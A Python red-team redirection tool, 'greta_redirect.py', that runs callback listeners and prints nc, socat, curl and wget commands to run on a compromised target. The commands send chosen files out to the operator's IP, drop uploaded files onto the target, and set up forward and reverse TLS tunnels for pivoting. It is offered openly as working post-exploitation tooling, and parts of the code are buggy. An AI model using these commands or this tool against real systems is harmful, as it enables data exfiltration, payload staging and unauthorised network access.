#!/usr/bin/python3

import socket
import threading
import os
import ssl
import argparse
import http.server
import socketserver
import logging

class redirect:
    
    def __init__(self, host=None, port=None, redirect_type=None, greta_calling=False, proto_type=None, upfile=None, downfile=None, filedest=None, ostype=None, cbip=None, cbport=None, dir=None, tunlp=None, tarport=None, tarip=None, certfile=None, keyfile=None):
        self.host = host
        self.port = port
        self.cert = certfile
        self.key = keyfile
        self.upfile = upfile
        self.downfile = downfile
        self.filedest = filedest
        self.retype = redirect_type
        self.proto = proto_type
        self.greta = greta_calling
        self.os = ostype
        self.cbip = cbip
        self.cbport = cbport
        self.dir = dir
        self.tunlp = tunlp
        self.tarport = tarport
        self.tarip = tarip
        self.uaddr = ""

    def start(self):
        if self.retype == "upload":
            self.upload()
        elif self.retype == "download":
            self.download()
        elif self.retype == "tunnel":
            self.tunnel()
        else:
            print("I am really impressed, I don't even know how you got this far!, not a valid redirect type")

    def log(self, log, message, level):
        
        logger = logging.getLogger(log)
        
        if not logger.handlers:
        
            f_handler = logging.FileHandler(f"./logs/{log}.log")
            f_format = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
            f_handler.setFormatter(f_format)
            logger.addHandler(f_handler)

            logger.setLevel(level)
            logger.info(message)

    def upload(self):
        
        if self.proto == "tcp":

            threading.Thread(target=self.tcp_server).start()
            print("WARNING THIS IS AN UNENCRYPTED UPLOAD")
            print("Please ensure your file for upload is in the upload directory")
            print("Upload your file with one of the following commands on target(adjust binary name as needed):")
            if self.os == "linux":
                print(f"nc -w 10 {self.cbip} {self.cbport} > {self.filedest} &")
                print(f"socat tcp:{self.cbip}:{self.cbport} - > {self.filedest} &")
            elif self.os == "windows":
                print(f"nc.exe -w 10 {self.cbip} {self.cbport} > {self.filedest}")
        
        elif self.proto == "tls":

            if self.cert and self.key:
                threading.Thread(target=self.tls_server).start()
                print(f"socat openssl-connect:{self.cbip}:{self.cbport},verify=0 - > {self.filedest} &")
            else:
                print("You didn't provide me any certs or keys there slick")

        elif self.proto == "udp":

            threading.Thread(target=self.udp_server).start()
            print("WARNING THIS IS AN UNENCRYPTED UPLOAD")
            if self.os == "linux":
                print(f"echo '' | nc -w 10 -u {self.cbip} {self.cbport} > {self.filedest} &")
                print(f"socat udp:{self.cbip}:{self.cbport} - > {self.filedest} &")
            elif self.os == "windows":
                print(f"nc.exe -w 10 {self.cbip} {self.cbport} > {self.filedest}")            

        elif self.proto == "http":
            threading.Thread(target=self.http_server).start()
            print("WARNING THIS IS AN UNENCRYPTED DOWNLOAD")
            print("Ensure your file is located in the http directory")
            if self.os == "linux":
                print("If you want to check they are there first")
                print(f"which curl wget")
                print(self.cbport) 
                if self.cbport != 80:
                    print("That's not port 80 hoss, this might look weird")
                    print(f"curl http://{self.cbip}:{self.cbport}/{self.upfile} -o {self.filedest}")
                    print(f"wget -t 1 http://{self.cbip}:{self.cbport}/{self.upfile} -O {self.filedest}")
                elif self.cbport == 80:
                    print(f"curl http://{self.cbip}/{self.upfile} -o {self.filedest}")
                    print(f"wget -t 1 http://{self.cbip}/{self.upfile} -O {self.filedest}")
            elif self.os == "windows":
                print("Insert powershell commands here")
            else:
                print("Unspecified OS type, I hope you know what you are doing")

        elif self.proto == "https":
            
            if self.cert and self.key:
        
                threading.Thread(target=self.https_server).start()
                print("Ensure your file is locatted in the http directory")
                if self.os == "linux":
                    print("If you want to check they are there first")
                    print(f"which curl wget")
               
                    if self.cbport != 443:
                        print("That's not port 443 hoss, this might look weird")
                        print(f"curl -k https://{self.cbip}:{self.cbport}/{self.upfile} -o {self.filedest}")
                        print(f"wget -t 1 --no-check-certificate https://{self.cbip}:{self.cbport}/{self.upfile} -O {self.filedest}")
                    elif self.cbport == 443:
                        print(f"curl -k https://{self.cbip}/{self.upfile} -o {self.filedest}")
                        print(f"wget -t 1 --no-check-certificate https://{self.cbip}/{self.upfile} -O {self.filedest}")
                elif self.os == "windows":
                    print("Insert powershell commands here")
                else:
                    print("Unspecified OS type, I hope you know what you are doing")
            
            else:
                print("You didn't provide me the certs or keys there slick")

    def download(self):
        if self.proto == "tcp":

            threading.Thread(target=self.tcp_server).start()
            print("WARNING THIS IS AN UNENCRYPTED DOWNLOAD")
            print("Download your file with one the following commands on target(adjust binary name as needed)")
            if self.os == "linux":
                print("If you want to check if they are there first")
                print(f"which nc socat")
                print(f"nc -w 10 {self.cbip} {self.cbport} < {self.downfile} &")
                print(f"socat tcp:{self.cbip}:{self.cbport} - < {self.downfile} &")
            elif self.os == "windows":
                print(f"nc.exe -w 10 {self.cbip} {self.cbport} < {self.downfile}")
            else:
                print("Unspecified OS type, I hope you know what you are doing")

        elif self.proto == "tls":

            if self.cert and self.key:
                threading.Thread(target=self.tls_server).start()
            else:
                print("You didn't provide me certs or keys there slick")
            if self.os == "linux":
                print("If you want to check if they are there first")
                print(f"which nc socat")
                print(f"socat openssl:{self.cbip}:{self.cbport} - < {self.downfile} &")
            elif self.os == "windows":
                print("powershell fu coming soon")
            else:
                print("Unspecified OS type, I hope you know what you are doing")

        elif self.proto == "udp":
            print("WARNING THIS IS AN UNENCRYPTED DOWNLOAD")
            print("Download your file with one the following commands on target(adjust binary name as needed)")
            if self.os == "linux":
                print("If you want to check if they are there first")
                print(f"which nc socat")
                print(f"echo '' | nc -u -w 10 {self.cbip} {self.cbport} < {self.downfile} &")
                print(f"socat tcp:{self.cbip}:{self.cbport} - < {self.downfile} &")
            elif self.os == "windows":
                print(f"nc.exe -w 10 {self.cbip} {self.cbport} < {self.downfile}")
            else:
                print("Unspecified OS type, I hope you know what you are doing")

            threading.Thread(target=self.udp_server).start()

    def tcp_server(self):
    
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.bind((self.host, self.port))
            server_socket.listen()
            print(f"{self.retype} server listening on {self.host}:{self.port}")
            client_socket, addr = server_socket.accept()
            client_socket.settimeout(10)
            log_targ = (f"{addr[0]}:{addr[1]}")
            if self.retype == "upload":
                message = (f"Connection from {addr[0]} to upload {self.upfile} to {self.filedest}")
                print(message)
                self.log(log_targ, message, "INFO")
            elif self.retype == "download":
                message = (f"connection from {addr[0]} to download {self.downfile} to {self.filedest}")
                print(message)
                self.log(log_targ, message, "INFO")

            self.handle_connection(client_socket, addr, log_targ)

    def tls_server(self):
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile=self.cert, keyfile=self.key)

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            with context.wrap_socket(server_socket, server_side=True) as tls_socket:
                tls_socket.bind((self.host, self.port))
                tls_socket.listen()
                print(f"{self.retype} server listening on {self.host}:{self.port}")
                client_socket, addr = tls_socket.accept()
                log_targ = (f"{addr[0]}:{addr[1]}")
                if self.retype == 'upload':
                    message = (f"Connection from {addr[0]} to upload {self.upfile} to {self.filedest}")
                    print(message)
                    self.log(log_targ, message, "INFO")
                elif self.retype == 'download':
                    message = (f"Connectin fron {addr[0]} to donload {self.downfile} to {self.filedest}")
                    print(message)
                    self.log(log_targ, message, "INFO")
                
                self.handle_connection(client_socket, addr, log_targ)

    def udp_server(self):
        print("udp server called")
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_socket.bind((self.host, self.port))
        udp_socket.settimeout(30)
        print(f"{self.retype} server listening on {self.host}:{self.port}")
        
        if self.retype == "upload":
            
            os.chdir("upload")
            data, addr = udp_socket.recvfrom(1024)
            log_targ = (f"{addr[0]}:{addr[1]}")
            
            ip = addr[0]
            port = addr[1]
            with open(self.upfile, 'rb') as file:
                data = file.read(1024)
                while data:
                    udp_socket.sendto(data, (ip,port))
                    data = file.read(1024)

                message = (f"File upload of {self.upfile} to {addr[0]} complete")
                print(message)
                os.chdir("..")
                self.log(log_targ, message, "INFO")
            udp_socket.close

        elif self.retype == "download":
            try:
                data, addr = udp_socket.recvfrom(1024)
                log_targ = (f"{addr[0]}:{addr[1]}")
            
                with open(self.filedest, 'wb') as file:
                    while data:
                        file.write(data)
                        try:
                            data, _ = udp_socket.recvfrom(1024)
                        except socket.timeout:
                            print("Download timed out watiing for data")
                            break

                message = (f"File download of {self.downfile} from {addr[0]} complete")
                print(message)
                self.log(log_targ, message, "INFO")
            except Exception as e:
                print(f"Unexpected Error during file download: {e}")
            finally:
                udp_socket.close

    def handle_connection(self, client_socket, addr, log_targ):

        try:
            while True:
                
                if self.retype == "upload":

                    os.chdir("upload")
                    with open(self.upfile, 'rb') as file:
                        data = file.read(1024)
                        while data:
                            client_socket.send(data)
                            data = file.read(1024)
                    os.chdir("..")
                    message = (f"File upload of {self.upfile} to {addr[0]} complete")
                    print(message)
                    self.log(log_targ, message, "INFO")
                    break
                
                elif self.retype == "download":

                    try:
                        with open(self.filedest, 'wb') as file:
                            while True:
                                try: 
                                    data = client_socket.recv(1024)
                                    if not data:
                                        break
                                    file.write(data)
                                except socket.timeout:
                                    break
                    finally:
                        message = (f"File download of {self.downfile} from {addr[0]} complete")
                        print(message)
                        self.log(log_targ, message, "INFO")
                        break
        finally:
            client_socket.close()
            print(f"Connection from {addr[0]} closed")

    def http_server(self):

        os.chdir("http")
        httpServerAddr = (self.host, self.port)
        handler = http.server.SimpleHTTPRequestHandler
        httpd = socketserver.TCPServer(httpServerAddr, handler)
        httpd.handle_request()
        httpd.server_close()
        os.chdir("..")

    def https_server(self):

        httpsContext = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        httpsContext.load_cert_chain(self.cert, self.key)

        os.chdir("http")
        
        httpsServerAddr = (self.host, self.port)
        httpsHandler= http.server.SimpleHTTPRequestHandler

        httpsd = socketserver.TCPServer(httpsServerAddr, httpsHandler)
        httpsd.socket = httpsContext.wrap_socket(httpsd.socket, server_side=True)
        httpsd.handle_request()
        httpsd.server_close()
        os.chdir("..")

    def tcp_tun(self, tunnel_socket, client_socket):
        def tunnel_to_client():
            try:
                while True:
                    t1data = tunnel_socket.recv(1024)
                    if not t1data:
                        print("No data t=>c")
                        break
                    client_socket.send(t1data)
            except:
                print("It broke")
        def client_to_tunnel():
            try:
                while True:
                    t2data = client_socket.recv(1024)
                    if not t2data:
                        print("No data c=>t")
                        break
                    tunnel_socket.send(t2data)
            except:
                print("It broke")

            t1 = threading.Thread(target=tunnel_to_client)
            t2 = threading.Thread(target=client_to_tunnel)

            t1.start()
            t2.start()

            t1.join()
            t2.join()


    def tunnel(self):
        
        if self.dir == "forward":
            
            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            context.load_cert_chain(certfile=self.cert, keyfile=self.key)

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
                with context.wrap_socket(server_socket, server_side=True) as tls_socket:
                    tls_socket.bind((self.host,self.cbport))
                    tls_socket.listen()

                    print("Run the following command on target to bend traffic")
                    print(f"UDP: socat openssl:{self.cbip}:{self.cbport},verify=0 udp:{self.tarip}:{self.tarport} &")
                    print(f"TCP: socat openssl:{self.cbip}:{self.cbport},verify=0 tcp:{self.tarip}:{self.tarport} &")

                    client_socket, addr = tls_socket.accept()


                    if self.proto == "udp":

                        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        udp_socket.bind(('0.0.0.0', self.tunlp))
                        message = (f"UDP Forward tunnel listening on {self.tunlp} going to {self.tarip}:{self.tarport}")
                        print(message)
                        self.log("server", message, "INFO")

                        def tunnel_to_client():
                            
                            try:
                                while True:
                                    udata, self.uaddr = udp_socket.recvfrom(1024)
                                    client_socket.send(udata)
                            except:
                                print("It broke")
                        
                        def client_to_tunnel():
                            try:
                                while True:
                                    tdata = client_socket.recv(1024)
                                    if not tdata:
                                        break
                                    ip, uport = self.uaddr[0], self.uaddr[1]
                                    udp_socket.sendto(tdata, (ip,uport))
                            except:
                                print("UDP tunnel error")

                        t1 = threading.Thread(target=tunnel_to_client)
                        t2 = threading.Thread(target=client_to_tunnel)

                        t1.start()
                        t2.start()

                        t1.join()
                        t2.join()

                    if self.proto == "tcp":
                    
                        tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        tcp_socket.bind(('0.0.0.0',self.tunlp))
                        tcp_socket.listen()
                        tunnel_socket, addr = tcp_socket.accept()
                    
                        def tunnel_to_client():
                            try:
                                while True:
                                    t1data = tunnel_socket.recv(1024)
                                    if not t1data:
                                        break
                                    client_socket.send(t1data)
                            except:
                                print("It broke")
                        
                        def client_to_tunnel():
                            try:
                                while True:
                                    t2data = client_socket.recv(1024)
                                    if not t2data:
                                        break
                                    tunnel_socket.send(t2data)
                            except:
                                print("It broke")

                        t1 = threading.Thread(target=tunnel_to_client)
                        t2 = threading.Thread(target=client_to_tunnel)

                        t1.start()
                        t2.start()

                        t1.join()
                        t2.join()
        
        if self.dir == "reverse":
            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            context.load_cert_chain(certfile=self.cert, keyfile=self.key)

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
                with context.wrap_socket(server_socket, server_side=True) as tls_socket:
                    tls_socket.bind((self.host,self.cbport))
                    tls_socket.listen()

                    print("Run the following command on target to bend traffic")
                    print(f"UDP: socat udp-listen:{self.tunlp} openssl:{self.cbip}:{self.cbport},verify=0 &")
                    print(f"TCP: socat tcp-listen:{self.tunlp} openssl:{self.cbip}:{self.cbport},verify=0 &")

                    client_socket, addr = tls_socket.accept()

                    if self.proto == "udp":

                        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        udp_socket.bind(('0.0.0.0', self.cbport))
                        message = (f"UDP Reverse tunnel listening remotely on {self.tunlp} going to {self.tarip}:{self.tarport}")
                        print(message)
                        self.log("server", message, "INFO")

                        def tunnel_to_client():
                            
                            try:
                                while True:
                                    udata, self.uaddr = udp_socket.recvfrom(1024)
                                    client_socket.send(udata)
                            except:
                                print("It broke")
                        
                        def client_to_tunnel():
                            try:
                                while True:
                                    tdata = client_socket.recv(1024)
                                    if not tdata:
                                        break
                                    udp_socket.sendto(tdata, (self.tarip,self.tarport))
                            except:
                                print("UDP tunnel error")

                        t1 = threading.Thread(target=tunnel_to_client)
                        t2 = threading.Thread(target=client_to_tunnel)

                        t1.start()
                        t2.start()

                        t1.join()
                        t2.join()

                    if self.proto == "tcp":
                    
                        tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        tcp_socket.connect((self.tarip,self.tarport))
                        tunnel_socket = tcp_socket

                        def tunnel_to_client():
                            try:
                                while True:
                                    t1data = tunnel_socket.recv(1024)
                                    if not t1data:
                                        break
                                    client_socket.send(t1data)
                            except:
                                print("tun=>cli broke")
                        
                        def client_to_tunnel():
                            try:
                                while True:
                                    t2data = client_socket.recv(1024)
                                    if not t2data:
                                        break
                                    tunnel_socket.send(t2data)
                            except:
                                print("cli=>tun broke")

                        t1 = threading.Thread(target=tunnel_to_client)
                        t2 = threading.Thread(target=client_to_tunnel)

                        t2.start()
                        t1.start()

                        t2.join()
                        t1.join()



def empty_check(check):

    if check == "":
        ("Empty input, exiting")
        quit()

def upload_int(ptype):


    upfile = input("what file do you wish to upload?(Must be in upload directory or give absolute path)")

    if ptype == "tcp" or ptype == "udp" or ptype == "tls":
        os.chdir("upload")
        if not os.path.isfile(upfile):
            print("File does not exist, exiting")
            quit()

    if ptype == "http" or ptype == "https":
        os.chdir("http")
        if not os.path.isfile(upfile):
            print("File does not exist, exiting")
            quit()        

    empty_check(upfile)
    
    os.chdir("..")
    return(upfile)

def host_int():
    host = input("Select the interface you want to bind to (0.0.0.0 is global): ")
    empty_check(host)
    port_str = input("Select a port to bind to: ")
    empty_check(port_str)
    port = int(port_str)
    return(host, port)

def ptype_int(retype):
    
    if retype == "upload":
        options = "tcp\nudp\ntls\nhttp\nhttps"
    elif retype == "download":
        options = "tcp\nudp\ntls"
    elif retype == "tunnel":
        options = "tcp\nudp"
    else:
        print("Unrecognized redirection type, exiting")
        quit()
    ptype = input(f"Please select what protocol you wish to use for your {retype}:\n{options}\nChoice: ")
    empty_check(ptype)
    return(ptype)

def filedest_int():
    
    filedest = input("Where do you want to write the file on target (needs at least a filename): ")
    empty_check(filedest)
    return(filedest)

def ostype_int():
    
    ostype = input("What kind of OS are you expecting?")
    empty_check(ostype)
    return(ostype)

def callback_int():

    callback = input("What IP and Port do you want the target to callback to (host:ip 192.168.1.1:1234): ")
    empty_check(callback)
    cbip, cbport_str = callback.split(":")
    cbport = int(cbport_str)
    return(cbip, cbport)

def tls_int():

    cert = input("Please provide the path to your cert file: ")
    key = input("Please provide the path to your key file: ")
    empty_check(cert)
    empty_check(key)
    return(cert, key)

def download_int():
    downfile = input("What file do you wish to download from the target(rember aboslute vs relatavie path): ")
    empty_check(downfile)
    return(downfile)

def set_interactive():
    
        choice = input("Select your redirector operation:\nupload\ndownload\ntunnel\nChoice: ")

        if choice == "upload":
            retype = choice
            host, port = host_int()
            ptype = ptype_int(retype)
            upfile = upload_int(ptype)
            filedest = filedest_int()
            ostype = ostype_int()
            cbip, cbport = callback_int()
            if ptype == "tls" or ptype =="https":
                certfile, keyfile = tls_int()
                server = redirect(host,port,retype,False,ptype,upfile,None,filedest,ostype,cbip,cbport,None,None,None,None,certfile,keyfile)
            else:
                server = redirect(host,port,retype,False,ptype,upfile,None,filedest,ostype,cbip,cbport,None,None,None,None,None,None)
            return(server)

        elif choice == "download":
            retype = choice
            host, port = host_int()
            ptype = ptype_int(retype)
            downfile = download_int()
            filedest = filedest_int()
            ostype = ostype_int()
            cbip, cbport = callback_int()
            if ptype != "tcp" and ptype != "udp" and ptype != "tls":
                print("Invalid protocol selected, bogus dude exiting")
                quit()
            if ptype == "tls":
                certfile, keyfile = tls_int()
                server = redirect(host,port,retype,False,ptype,None,downfile,filedest,ostype,cbip,cbport,None,None,None,None,certfile,keyfile)
            else:
                server = redirect(host,port,retype,False,ptype,None,downfile,filedest,ostype,cbip,cbport,None,None,None,None,None,None)
            return(server)
        
        elif choice == "tunnel":
            retype = choice
            host, port = host_int()
            dir = input("Is this a forward or reverse tunnel?: ")
            empty_check(dir)
            tunlp_str = input("What port do you want the tunnel to listen on (forward will be local, reverse will be remote): ")
            empty_check(tunlp_str)
            tunlp = int(tunlp_str)
            tarip = input("Where do you want the redirected traffic to go?: ")
            empty_check(tarip)
            tarport_str = input("And on what port do you want to send the traffic?: ")
            empty_check(tarport_str)
            tarport = int(tarport_str)
            cbip, cbport = callback_int()
            ptype = ptype_int(retype)
            if ptype != "tcp" and ptype != "udp":
                print("Invalid protocol selected, bogus dude exiting")
                quit()
            certfile, keyfile = tls_int()
            server = redirect(host=host, port=port, redirect_type=retype, proto_type=ptype, dir=dir, tunlp=tunlp, tarport=tarport, tarip=tarip, certfile=certfile, keyfile=keyfile, cbip=cbip, cbport=cbport)
            return(server)

        else:
            print("Choice not regonized, try again!")

if __name__ == "__main__":

    parser = argparse.ArgumentParser(prog="greta_redirect.py version 0.5", description="Open source file and traffic redirection for the red teamer on the go", epilog="Routes? Where we are going we don't need routes")
    parser.add_argument('-i', '--interactive', action='store_true', help='This option walks through an interactive menu to set values and will ignore any other options')
    parser.add_argument('-l', '--host', type=str, help='Set host for listener to bind to', required=False)
    parser.add_argument('-p', '--port', type=int, help='Set port for listner to bind to', required=False)
    parser.add_argument('-r', '--redirect_type', type=str, help='Pick the redirection type you want:\nupload\ndownload\ntunnel', required=False)
    parser.add_argument('-t', '--proto_type', type=str, help='Pick the protocol type:\nupload:\ntcp\nudp\ntls\nhttps\nhttp\n\nDownload:\ntcp\nudp\ntls\n\nredirect:\ntcp\nudp', required=False)
    parser.add_argument('--direction', type=str, help='Pick forward or reverse tunnel', required=False)
    parser.add_argument('--tun_listen_port', type=int, help='Tunnel to bind on, for forward this will be on your device, for reverse this will be on the target', required=False)
    parser.add_argument('--target_port', type=int, help='Port that tunnel will send traffic to', required=False)
    parser.add_argument('--target_ip', type=str, help='Target ip you want to bend your traffic to', required=False)
    parser.add_argument('-u', '--upfile', type=str, help='File you wish to upload, for http and https please ensure they are in a folder called http', required=False)
    parser.add_argument('-d', '--downfile', type=str, help='File you wish to download', required=False)
    parser.add_argument('-f', '--file_dest', type=str, help='This is where you want to save the file to (upload would be on target, download will be on your host)', required=False)
    parser.add_argument('-o', '--ostype', type=str, help='The type of OS you will be interacting from:\nlinux\nwindows', required=False)
    parser.add_argument('-b', '--callback', type=str, help='Callback IP:PORT (192.168.1.1:1234)', required=False)
    parser.add_argument('-c', '--certfile', type=str, help='Set the TLS certificate file', required=False)
    parser.add_argument('-k', '--keyfile', type=str, help='Set the TLS key file', required=False)

    args = parser.parse_args()

    greta_calling = False

    if args.host:
        host = args.host
    
    if args.port:
        port = args.port

    if args.redirect_type:
        retype = args.redirect_type

    if args.proto_type:
        ptype = args.proto_type

    if args.direction:
        dir = args.direction

    if args.tun_listen_port:
        tunlp = args.tun_listen_port

    if args.target_port:
        tarport = args.target_port

    if args.target_ip:
        tarip = args.target_ip

    if args.upfile:
        upfile = args.upfile

    if args.downfile:
        downfile = args.downfile
    
    if args.file_dest:
        filedest = args.file_dest

    if args.ostype:
        ostype = args.ostype

    if args.callback:
        callback = args.callback

    if args.certfile:
        certfile = args.certfile

    if args.keyfile:
        keyfile = args.keyfile

    if args.interactive:
        server = set_interactive()
    elif not retype:
        print("No action selected, please specify a redirect type")
    elif retype == "upload":
        if host and port and ptype and upfile and filedest and ostype and callback:
            cbip, cbport_str = callback.split(':')
            cbport = int(cbport_str)
            if ptype == "tls":
                if certfile and keyfile:
                    server = redirect(host,port,retype,greta_calling,ptype,upfile,None,filedest,ostype,cbip,cbport,None,None,None,None,certfile,keyfile)
                else:
                    server = redirect(host,port,retype,greta_calling,ptype,upfile,None,filedest,ostype,cbip,cbport,None,None,None,None,None,None)
        else:
            print("Missing switch options, required is host, port, upfile, file_dest, ostype and callback")
    elif retype == "download":
        if host and port and ptype and downfile and filedest and ostype and callback:
            cbip, cbport_str = callback.split(':')
            cbport = int(cbport_str)
            if ptype == "tls":
                if certfile and keyfile:
                    server = redirect(host,port,retype,greta_calling,ptype,None,downfile,filedest,ostype,cbip,cbport,None,None,None,None,certfile,keyfile)
                else:
                    server = redirect(host,port,retype,greta_calling,ptype,None,downfile,filedest,ostype,cbip,cbport,None,None,None,None,None,None)
        else:
            print("Missing switch options, required is host, port, downfile, file_dest, ostype and callback")
    elif retype == "tunnel":
        if host and port and ptype and dir and tunlp and tarport and tarip and certfile and keyfile:
            server = redirect(host=host, port=port, redirect_type=retype, proto_type=ptype, dir=dir, tunlp=tunlp, tarport=tarport, tarip=tarip )
        else:
            print('missing switch options, required is direction, tun_listen_port, target_port, target_ip, certfile, keyfile')

    server.start()